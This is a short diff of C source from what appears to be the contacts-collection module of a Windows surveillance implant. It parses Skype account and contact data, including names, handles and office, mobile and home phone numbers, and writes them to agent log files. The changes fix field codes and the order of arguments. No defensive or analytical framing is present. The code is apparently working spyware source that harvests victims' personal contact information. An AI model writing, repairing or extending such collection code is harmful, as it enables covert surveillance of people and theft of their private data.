@@ -70,8 +70,8 @@ BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *
 	ADD_CONTACT_STRING(phone_off, 0xA);
 	ADD_CONTACT_STRING(phone_mob, 0x7);
 	ADD_CONTACT_STRING(phone_hom, 0xC);
-	ADD_CONTACT_STRING(screen_name, 0x33);
-	ADD_CONTACT_STRING(facebook_page, 0x38);
+	ADD_CONTACT_STRING(screen_name, 0x40);
+	ADD_CONTACT_STRING(facebook_page, 0x40);
 
 	Log_WriteFile(hfile, tolog.get_buf(), tolog.get_len());
 
@@ -132,7 +132,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 			msg += strlen("CURRENTUSERHANDLE ");
 			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 			_snwprintf_s(user_handle, sizeof(user_handle)/sizeof(WCHAR), _TRUNCATE, L"%S", msg);		
-			DumpContact(hfile, CONTACT_SRC_SKYPE, user_handle, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
+			DumpContact(hfile, CONTACT_SRC_SKYPE, user_handle, NULL, NULL, NULL, NULL, NULL, NULL, NULL, user_handle, NULL, CONTACTS_MYACCOUNT);
 			Log_CloseFile(hfile);
 			return 1;
 		}
@@ -184,7 +184,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 			if (wptr)
 				*wptr = 0;
 
-			DumpContact(hfile, CONTACT_SRC_SKYPE, user_handle, NULL, NULL, NULL, NULL, phone_off, phone_mob, phone_hom, user_name, NULL, 0);
+			DumpContact(hfile, CONTACT_SRC_SKYPE, user_name, NULL, NULL, NULL, NULL, phone_off, phone_mob, phone_hom, user_handle, NULL, 0);
 
 		} while(msg = (BYTE *)strchr((char *)msg, ','));
 		Log_CloseFile(hfile);
